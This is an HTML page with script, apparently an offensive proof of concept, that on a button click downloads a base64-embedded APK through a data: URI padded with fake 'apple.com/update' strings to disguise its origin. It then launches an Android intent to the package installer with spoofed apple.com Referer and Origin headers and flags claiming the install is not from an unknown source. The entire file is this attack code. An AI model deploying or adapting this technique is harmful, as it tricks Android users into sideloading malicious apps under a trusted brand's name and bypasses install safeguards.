<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Intent Dispatcher</title>
    <style>
        body {
            font-family: monospace;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            background-color: #121212;
            color: #ffffff;
        }
        button {
            padding: 15px 30px;
            font-size: 16px;
            font-weight: bold;
            background-color: #00ffcc;
            color: #000000;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            box-shadow: 0 4px 6px rgba(0,0,0,0.3);
        }
        button:active {
            transform: scale(0.98);
        }
        #status {
            margin-top: 20px;
            font-size: 14px;
            color: #00ffcc;
        }
    </style>
</head>
<body>

    <button id="strikeBtn">Execute Package Dispatch</button>
    <div id="status"></div>

    <script>
        document.getElementById('strikeBtn').addEventListener('click', function() {
            // --- 1. CONFIGURATION ---
            const filename = "app.apk";
            const realDomain = "apple.com";

            // --- 2. ADVANCED SPOOFING LOGIC ---
            // Menggunakan fragment (#) dan padding masif untuk mengecoh parser UI browser.
            const padding = ".https://" + realDomain + "/update/".repeat(25);
            const longSub = realDomain + padding;

            // --- 3. PAYLOAD CONSTRUCTION (Self-generated local Base64 APK) ---
            const base64Payload = "UEsDBAoAAAAAAKp2ZVIAAAAAAAAAAAAAAAAJABwAYXBwLmFwa1BLAQIFAAAAAAAKqmVSGgAAAAAAAAAAAAAAAAAmAAgAAAAAAAAAAAAAALaBAAAAAGEwcGsuYXBrUEsFBgAAAAABAAEATgAAAE8AAAA="; 
            const payload = `data:application/vnd.android.package-archive;base64,${base64Payload}#${longSub}`;

            // --- 4. EXECUTION ---
            const a = document.createElement('a');
            a.href = payload;
            a.download = filename;
            a.rel = "noopener";

            document.body.appendChild(a);
            a.click();

            document.getElementById('status').innerText = "> INJECTING_ORIGIN: " + realDomain;

            // --- 5. CLEANUP & INTENT FALLBACK DISPATCH ---
            setTimeout(() => {
                document.body.removeChild(a);
                
                // Eksekusi Intent URL 1-line dengan manipulasi asal ke apple.com
                const targetIntent = "intent://apple.com/#Intent;scheme=https;package=com.android.packageinstaller;action=android.intent.action.VIEW;category=android.intent.category.DEFAULT;type=application/vnd.android.package-archive;launchFlags=0x10800000;S.browser_fallback_url=" + encodeURIComponent(payload) + ";S.com.android.browser.application_id=org.mozilla.firefox;S.android.intent.extra.REFERRER_NAME=android-app%3A%2F%2Forg.mozilla.firefox;S.com.android.browser.headers=Referer%3A%https%3A%2F%2Fapple.com%2F%0AOrigin%3A%https%3A%2F%2Fapple.com%2F;B.android.intent.extra.NOT_UNKNOWN_SOURCE=true;B.android.intent.extra.INSTALLER_PACKAGE_NAME=org.mozilla.firefox;end";
                
                window.location.replace(targetIntent);
            }, 1800);
        });
    </script>

</body>
</html>
